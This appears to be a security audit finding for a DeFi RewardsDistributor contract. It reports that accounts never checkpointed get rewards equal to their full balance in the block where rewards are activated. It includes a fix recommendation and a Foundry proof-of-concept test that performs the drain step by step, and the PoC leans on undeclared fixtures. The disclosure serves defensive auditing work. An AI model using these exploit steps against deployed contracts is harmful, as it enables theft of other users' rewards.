### Title
Accounts never indexed receive `deltaIndex = INITIAL_INDEX` and are credited rewards equal to their full token balance - (File: contracts/RewardsDistributor.sol)

### Summary
The CVE analog (a deferred consumer dereferencing an object whose lifetime was never pinned) maps to `RewardsDistributor._calculateTokenDelta`, which consumes a stale/uninitialized `accountIndexOf[token_][account_]` snapshot. When an account's stored index is `0` and the global `tokenStates` index is still exactly `INITIAL_INDEX`, the fallback that should "pin" the account to `INITIAL_INDEX` does not fire (it only fires when `_tokenIndex > INITIAL_INDEX`), so `_deltaIndex` underflows to `1e18` and the account accrues `balance * 1` reward tokens for free.

### Finding Description [1](#0-0) 

```solidity
_tokenIndex = _tokenState.index;                       // == INITIAL_INDEX (1e18) in the activation block
uint256 _accountIndex = accountIndexOf[token_][account_];  // == 0 for an account never updated

if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;                     // NOT taken when _tokenIndex == INITIAL_INDEX
}

uint256 _deltaIndex = _tokenIndex - _accountIndex;     // 1e18 - 0 = 1e18
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex); // balance * 1e18 / 1e18 == balance
```

When rewards are activated for a token, `_updateTokenSpeed` writes `tokenStates[token_] = {index: INITIAL_INDEX, timestamp: block.timestamp}` [2](#0-1) . While `index == INITIAL_INDEX`, `_calculateTokenIndex` produces no new index because `_deltaTimestamps == 0` in the same block [3](#0-2) . Any account holding a `DepositToken`/`DebtToken` balance that was acquired while `tokenStates` was `0` (i.e., before speed was set — `updateBeforeMintOrBurn`/`updateBeforeTransfer` no-op on `index == 0` [4](#0-3) ) still has `accountIndexOf == 0`. A single public, permissionless call to `updateBeforeMintOrBurn(token, attacker)` then permanently credits `tokensAccruedOf[attacker] += depositBalance` [5](#0-4) , withdrawable via `claimRewards` [6](#0-5) .

### Impact Explanation
The attacker is credited reward tokens equal to their deposit-token/debt-token balance (a 1:1 accrual bounded only by `wadMul` of the full index step `1e18`). `claimRewards` pays out the distributor's entire `rewardToken` balance up to the accrued amount via `_transferRewardIfEnoughTokens` [7](#0-6) . This is direct theft of unclaimed yield: rewards funded for all honest stakers/borrowers can be drained by an account that contributed for zero seconds. The broken invariant is reward accrual — accrual must be proportional to `balance * (currentIndex - accountStartIndex)`; here `accountStartIndex` is treated as `0` instead of `INITIAL_INDEX`.

### Likelihood Explanation
The window is narrow: `tokenStates[token].index` equals `INITIAL_INDEX` only during the block in which the governor first activates a nonzero speed for that token (or during any block where the stored timestamp equals `block.timestamp`). An unprivileged attacker can front-run/back-run the public `updateTokenSpeed`/`updateTokenSpeeds`/`syncTokenSpeed` transaction: hold (or freshly acquire, since `index == 0` means transfers do not record indexes) a large `DepositToken` balance, then call `updateBeforeMintOrBurn` and later `claimRewards` in the same block or any block where `index` is still `INITIAL_INDEX`. No privileged role, oracle manipulation, or malicious relayer is needed; every step is a public entry point. The exploit repeats whenever a new token's speed is activated — a routine operational event.

### Recommendation
In `_calculateTokenDelta`, treat an uninitialized account index as the current token index unconditionally:

```solidity
if (_accountIndex == 0) {
    _accountIndex = _tokenIndex; // no accrual for accounts never checkpointed at this index
}
```

Alternatively, clamp `_deltaIndex` to `0` when `_tokenIndex <= INITIAL_INDEX` and the account index is `0`. Also consider checkpointing `accountIndexOf` to `INITIAL_INDEX` at the moment `tokenStates` is initialized for accounts that already hold balances.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {RewardsDistributor} from "contracts/RewardsDistributor.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";

// Assumes pool, depositToken, rewardsDistributor are deployed/wired per existing fixtures
// (see test/ directory for the deployed-configuration fork setup).
contract RewardIndexBugTest is Test {
    function test_UnindexedAccountDrainsRewards() public {
        address attacker = makeAddr("attacker");
        IERC20 rewardToken = rewardsDistributor.rewardToken();

        // 1. Before speed is set, attacker deposits -> depositToken balance,
        //    accountIndexOf stays 0 because tokenStates.index == 0 (no-op).
        deal(underlying, attacker, 1_000_000e18);
        vm.startPrank(attacker);
        IERC20(underlying).approve(address(depositToken), type(uint256).max);
        depositToken.deposit(1_000_000e18, attacker);
        vm.stopPrank();

        // 2. Governor activates rewards for this token in the same block.
        vm.prank(governor);
        rewardsDistributor.updateTokenSpeed(IERC20(address(depositToken)), 1e18);

        // 3. Same block: tokenStates.index == INITIAL_INDEX, accountIndexOf == 0.
        //    deltaIndex = 1e18 -> tokensAccruedOf += depositToken.balanceOf(attacker)
        rewardsDistributor.updateBeforeMintOrBurn(IERC20(address(depositToken)), attacker);

        uint256 accrued = rewardsDistributor.tokensAccruedOf(attacker);
        assertEq(accrued, depositToken.balanceOf(attacker)); // free accrual

        // 4. Attacker claims; receives up to the distributor's rewardToken balance.
        uint256 balBefore = rewardToken.balanceOf(attacker);
        rewardsDistributor.claimRewards(attacker);
        assertGt(rewardToken.balanceOf(attacker) - balBefore, 0);
    }
}
```

Note: the exact window depends on `tokenStates[token].index` remaining equal to `INITIAL_INDEX` (same-block as activation); the PoC must execute steps 2–3 in one block via `vm.roll`/mempool ordering on a fork.
